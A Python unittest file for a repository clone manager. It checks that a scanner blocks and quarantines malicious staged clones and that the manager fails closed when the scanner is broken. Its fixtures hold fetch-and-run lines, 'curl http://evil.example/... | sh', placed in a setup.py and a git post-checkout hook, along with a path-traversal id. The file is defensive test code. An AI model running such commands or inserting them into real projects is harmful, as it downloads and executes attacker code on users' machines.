#!/usr/bin/env python3
"""test_repo.py — exercise repo.py's gated arbitrary-URL clone manager (file 06 §3).

The SECURITY-load-bearing path is the GATE DECISION over a STAGED clone, so we drive the
REAL nemesis binary over LOCALLY-PLANTED staging dirs (NO network, NO remote fetch):

  * malicious staged tree (curl|sh / post-checkout hook) → verdict BLOCK → NOT promoted,
    QUARANTINED (kept, not deleted) + status=blocked.
  * clean staged tree → verdict allow → promoted to the live repos root + an index entry
    + a NemesisVerdictRef written.
  * rescan / list / remove round-trip on a local fixture.
  * fail-closed when NEMESIS_BIN is bogus (scanner unverifiable ⇒ error ⇒ BLOCK).

Plus a best-effort REAL clone of a tiny LOCAL ``file://`` repo (offline) to prove the
clone path + ``_GIT_SAFE_FLAGS`` are wired correctly; skipped if git is unavailable.

Every verb is also run as a SUBPROCESS to assert the one-JSON-object stdout contract.
Hermetic: a temp $PROMETHEUS_REPOS_HOME so nothing touches the real ~/.config.
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

HERE = Path(__file__).resolve().parent
REPO_PY = HERE / "repo.py"
sys.path.insert(0, str(HERE))
import repo as repomod  # noqa: E402
import nemesis_gate  # noqa: E402

_MALICIOUS = 'import os\nos.system("curl http://evil.example/x.sh | sh")\n'
_HOOK = '#!/bin/sh\ncurl http://evil.example/pwn.sh | sh\n'
_CLEAN_README = "# demo\nA harmless repository for the gate test.\n"


def run_verb(env_extra: dict, *args: str) -> tuple[dict, str, int]:
    """Run repo.py as a subprocess; assert exactly ONE JSON object on stdout."""
    proc = subprocess.run(
        [sys.executable, str(REPO_PY), *args],
        capture_output=True, text=True, timeout=240,
        env={**os.environ, **env_extra},
    )
    lines = [ln for ln in proc.stdout.strip().splitlines() if ln.strip()]
    assert len(lines) == 1, f"expected ONE stdout line, got {len(lines)}: {proc.stdout!r}"
    return json.loads(lines[0]), proc.stderr, proc.returncode


class RepoStoreBase(unittest.TestCase):
    def setUp(self) -> None:
        self.home = tempfile.mkdtemp(prefix="repo-home-")
        os.environ["PROMETHEUS_REPOS_HOME"] = self.home

    def tearDown(self) -> None:
        shutil.rmtree(self.home, ignore_errors=True)
        os.environ.pop("PROMETHEUS_REPOS_HOME", None)

    def _stage(self, files: dict) -> Path:
        d = Path(tempfile.mkdtemp(prefix="repo-stage-"))
        for name, body in files.items():
            fp = d / name
            fp.parent.mkdir(parents=True, exist_ok=True)
            fp.write_text(body, encoding="utf-8")
        return d


# --------------------------------------------------------------------------- #
# THE GATE DECISION (real nemesis over planted local staging dirs; no network).
# --------------------------------------------------------------------------- #

class GateDecisionTests(RepoStoreBase):
    def test_malicious_staged_clone_is_blocked_and_quarantined(self) -> None:
        stg = self._stage({"setup.py": _MALICIOUS})
        r = repomod._gate_staged(
            repo_id="sketchy__repo", url="https://example.com/sketchy/repo",
            owner="sketchy", name="repo", branch="main", stage=stg,
        )
        self.assertFalse(r["promoted"])
        self.assertTrue(r["blocked"])
        self.assertEqual(r["gate"]["verdict"], "block")
        self.assertEqual(r["status"], "blocked")
        # staged clone quarantined (kept for inspection), NOT promoted, NOT in the index
        self.assertIn("quarantined", r)
        self.assertTrue(Path(r["quarantined"]).exists())
        self.assertFalse(stg.exists())  # moved aside
        self.assertFalse(repomod.live_dir_for("sketchy__repo").exists())
        self.assertEqual(repomod._read_index(), [])

    def test_post_checkout_hook_in_tree_is_blocked(self) -> None:
        # a repo shipping a post-checkout hook is exactly the TOCTOU vector the safe
        # flags neutralize at clone time; nemesis still flags the curl|sh body.
        stg = self._stage({".git/hooks/post-checkout": _HOOK, "README.md": _CLEAN_README})
        r = repomod._gate_staged(
            repo_id="evil__hook", url="https://example.com/evil/hook",
            owner="evil", name="hook", branch="main", stage=stg,
        )
        self.assertFalse(r["promoted"])
        self.assertTrue(r["blocked"])
        self.assertIn(r["gate"]["verdict"], ("block", "error"))

    def test_clean_staged_clone_is_promoted_with_index_entry_and_verdict_ref(self) -> None:
        stg = self._stage({"README.md": _CLEAN_README, "LICENSE": "MIT License\n"})
        r = repomod._gate_staged(
            repo_id="acme__lib", url="https://github.com/acme/lib.git",
            owner="acme", name="lib", branch="main", stage=stg,
        )
        self.assertTrue(r["promoted"])
        self.assertEqual(r["verdict"], "allow")
        self.assertEqual(r["status"], "cloned")
        # promoted into the live repos root
        live = Path(r["local_path"])
        self.assertTrue((live / "README.md").exists())
        self.assertFalse(stg.exists())  # moved into place
        # a NemesisVerdictRef is written + bound into the index entry
        ref = r["verdict_ref"]
        for k in ("verdict", "score", "commit", "signedAt", "findingsRef"):
            self.assertIn(k, ref)
        self.assertEqual(ref["verdict"], "allow")
        idx = repomod._read_index()
        self.assertEqual(len(idx), 1)
        self.assertEqual(idx[0]["id"], "acme__lib")
        self.assertEqual(idx[0]["status"], "cloned")
        self.assertEqual(idx[0]["lastVerdict"]["verdict"], "allow")

    def test_force_promotes_block_and_flags_forced_danger(self) -> None:
        stg = self._stage({"setup.py": _MALICIOUS})
        r = repomod._gate_staged(
            repo_id="forced__repo", url="https://example.com/forced/repo",
            owner="forced", name="repo", branch="main", stage=stg, force=True,
        )
        self.assertTrue(r["promoted"])
        self.assertIn("forced_danger", r)
        self.assertEqual(r["forced_danger"]["verdict"], "block")
        # promoted despite the block, and indexed
        self.assertTrue(repomod.live_dir_for("forced__repo").exists())
        self.assertEqual(len(repomod._read_index()), 1)

    def test_failclosed_when_nemesis_bin_is_bogus(self) -> None:
        # plant a real-but-bogus NEMESIS_BIN: a file find_nemesis() will accept and run
        # (highest precedence), but which emits NO verdict object → unparseable → error
        # → fail-closed BLOCK. A clean tree must NOT be promoted when the scanner is bogus.
        stg = self._stage({"README.md": _CLEAN_README})
        bogus = Path(self.home) / "bogus-nemesis.py"
        bogus.write_text("import sys; sys.stdout.write('not a verdict\\n')\n", encoding="utf-8")
        os.environ["NEMESIS_BIN"] = str(bogus)
        try:
            r = repomod._gate_staged(
                repo_id="fc__repo", url="https://example.com/fc/repo",
                owner="fc", name="repo", branch="main", stage=stg,
            )
        finally:
            os.environ.pop("NEMESIS_BIN", None)
        self.assertFalse(r["promoted"])
        self.assertTrue(r["blocked"])
        self.assertEqual(r["verdict"], "error")
        self.assertIn("quarantined", r)
        self.assertFalse(repomod.live_dir_for("fc__repo").exists())

    def test_failclosed_on_missing_stage_dir(self) -> None:
        r = repomod._gate_staged(
            repo_id="nostage", url="https://example.com/x/y", owner="x", name="y",
            branch="main", stage=Path("/tmp/__definitely_not_here_repo_sidecar__"),
        )
        self.assertFalse(r["promoted"])
        self.assertTrue(r["blocked"])
        self.assertEqual(r["verdict"], "error")


# --------------------------------------------------------------------------- #
# rescan / list / remove round-trip on a local fixture (subprocess contract).
# --------------------------------------------------------------------------- #

class LifecycleRoundTripTests(RepoStoreBase):
    def _seed_clean_repo(self, repo_id: str = "acme__lib") -> dict:
        stg = self._stage({"README.md": _CLEAN_README})
        r = repomod._gate_staged(
            repo_id=repo_id, url="https://github.com/acme/lib.git",
            owner="acme", name="lib", branch="main", stage=stg,
        )
        self.assertTrue(r["promoted"])
        return r

    def test_clone_staged_then_list_then_rescan_then_remove(self) -> None:
        env = {"PROMETHEUS_REPOS_HOME": self.home}
        stg = self._stage({"README.md": _CLEAN_README, "LICENSE": "MIT\n"})

        # clone via subprocess with --staged (the offline, security-load-bearing path)
        obj, _err, code = run_verb(env, "clone", "--url",
                                   "https://github.com/acme/lib.git", "--staged", str(stg))
        self.assertEqual(obj["command"], "clone")
        self.assertTrue(obj["ok"], msg=obj.get("error"))
        self.assertEqual(code, 0)
        self.assertTrue(obj["promoted"])
        repo_id = obj["id"]

        # list shows the one repo
        lst, _e, c = run_verb(env, "list")
        self.assertTrue(lst["ok"])
        self.assertEqual(lst["count"], 1)
        self.assertEqual(lst["repos"][0]["id"], repo_id)
        self.assertEqual(lst["repos"][0]["status"], "cloned")

        # rescan re-runs nemesis on the live tree (no fetch) and refreshes the verdict ref
        rs, _e2, c2 = run_verb(env, "rescan", "--id", repo_id)
        self.assertTrue(rs["ok"])
        self.assertEqual(rs["verdict"], "allow")
        self.assertEqual(rs["status"], "cloned")
        self.assertIn("verdict_ref", rs)

        # remove drops the clone dir + index entry
        rm, _e3, c3 = run_verb(env, "remove", "--id", repo_id)
        self.assertTrue(rm["ok"])
        self.assertTrue(rm["removed_dir"])
        self.assertTrue(rm["removed_entry"])
        lst2, _e4, _c4 = run_verb(env, "list")
        self.assertEqual(lst2["count"], 0)

    def test_list_empty_when_no_index(self) -> None:
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home}, "list")
        self.assertTrue(obj["ok"])
        self.assertEqual(code, 0)
        self.assertEqual(obj["count"], 0)
        self.assertEqual(obj["repos"], [])

    def test_list_marks_missing_when_clone_dir_gone(self) -> None:
        self._seed_clean_repo("gone__repo")
        # delete the clone dir out from under the index
        shutil.rmtree(repomod.live_dir_for("gone__repo"), ignore_errors=True)
        obj, _e, _c = run_verb({"PROMETHEUS_REPOS_HOME": self.home}, "list")
        self.assertEqual(obj["repos"][0]["status"], "missing")

    def test_rescan_unknown_id_fails(self) -> None:
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home},
                                 "rescan", "--id", "no-such-repo")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_remove_unknown_id_is_idempotent_ok(self) -> None:
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home},
                                 "remove", "--id", "ghost")
        self.assertTrue(obj["ok"])
        self.assertEqual(code, 0)
        self.assertFalse(obj["found"])
        self.assertFalse(obj["removed_dir"])


# --------------------------------------------------------------------------- #
# subprocess contract + argument validation.
# --------------------------------------------------------------------------- #

class ContractTests(RepoStoreBase):
    def test_clone_requires_url(self) -> None:
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home}, "clone")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_unknown_verb_fails_closed(self) -> None:
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home}, "nope")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)

    def test_clone_malicious_staged_subprocess_exit2(self) -> None:
        stg = self._stage({"setup.py": _MALICIOUS})
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home},
                                 "clone", "--url", "https://example.com/evil/x",
                                 "--staged", str(stg))
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)
        self.assertTrue(obj["blocked"])
        self.assertEqual(obj["status"], "blocked")

    def test_pin_requires_sha(self) -> None:
        # seed a repo first so the id resolves, then call pin without --sha
        stg = self._stage({"README.md": _CLEAN_README})
        repomod._gate_staged(repo_id="acme__lib", url="https://github.com/acme/lib.git",
                             owner="acme", name="lib", branch="main", stage=stg)
        obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home},
                                 "pin", "--id", "acme__lib")
        self.assertFalse(obj["ok"])
        self.assertEqual(code, 2)


class UrlParseTests(unittest.TestCase):
    def test_https_url(self) -> None:
        m = repomod.parse_url("https://github.com/yt-dlp/yt-dlp.git")
        self.assertEqual(m["owner"], "yt-dlp")
        self.assertEqual(m["name"], "yt-dlp")
        self.assertEqual(m["id"], "yt-dlp__yt-dlp")

    def test_ssh_scp_url(self) -> None:
        m = repomod.parse_url("git@github.com:acme/lib.git")
        self.assertEqual(m["owner"], "acme")
        self.assertEqual(m["name"], "lib")
        self.assertEqual(m["id"], "acme__lib")

    def test_safe_id_strips_dotdot(self) -> None:
        self.assertNotIn("..", repomod._safe_id("../../etc/passwd"))


# --------------------------------------------------------------------------- #
# best-effort REAL clone of a tiny LOCAL file:// repo (offline) → gate → promote.
# Proves the clone path + safe flags wire up. Skipped if git is unavailable.
# --------------------------------------------------------------------------- #

class RealLocalCloneTests(RepoStoreBase):
    def test_real_file_url_clone_is_gated_and_promoted(self) -> None:
        git = shutil.which("git")
        if not git:
            self.skipTest("git not on PATH")
        src = Path(tempfile.mkdtemp(prefix="repo-src-"))
        try:
            for argv in (
                [git, "init", "-q", str(src)],
                [git, "-C", str(src), "config", "user.email", "t@t.t"],
                [git, "-C", str(src), "config", "user.name", "t"],
            ):
                subprocess.run(argv, check=True, capture_output=True, timeout=60)
            (src / "README.md").write_text(_CLEAN_README, encoding="utf-8")
            subprocess.run([git, "-C", str(src), "add", "-A"], check=True,
                           capture_output=True, timeout=60)
            subprocess.run([git, "-C", str(src), "commit", "-qm", "init"], check=True,
                           capture_output=True, timeout=60)

            url = f"file://{src}"
            obj, _e, code = run_verb({"PROMETHEUS_REPOS_HOME": self.home},
                                     "clone", "--url", url)
            self.assertTrue(obj["ok"], msg=obj.get("error"))
            self.assertEqual(code, 0)
            self.assertTrue(obj["promoted"])
            self.assertEqual(obj["verdict"], "allow")
            # a real HEAD sha was captured and bound into the verdict ref
            self.assertTrue(obj["verdict_ref"]["commit"])
            live = Path(obj["local_path"])
            self.assertTrue((live / "README.md").exists())
        finally:
            shutil.rmtree(src, ignore_errors=True)


if __name__ == "__main__":
    unittest.main(verbosity=2)
